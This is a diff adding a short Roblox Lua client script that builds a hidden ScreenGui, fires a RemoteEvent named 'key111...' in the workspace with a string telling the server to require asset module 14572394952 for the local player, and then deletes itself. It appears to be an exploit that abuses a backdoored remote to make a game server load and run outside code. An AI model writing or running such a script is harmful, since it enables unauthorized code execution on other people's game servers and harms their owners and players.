@@ -1,0 +1,13 @@
+local ScreenGui = Instance.new("ScreenGui")
+
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local function WTBITG_fake_script() -- ScreenGui.LocalScript 
+	local script = Instance.new('LocalScript', ScreenGui)
+
+	game.workspace.key11111111111111111111111.Remote:FireServer("require(14572394952)(".."'"..game.Players.LocalPlayer.Name.."'"..")", "hi", "invis")
+	script.Parent:Destroy()
+end
+coroutine.wrap(WTBITG_fake_script)()
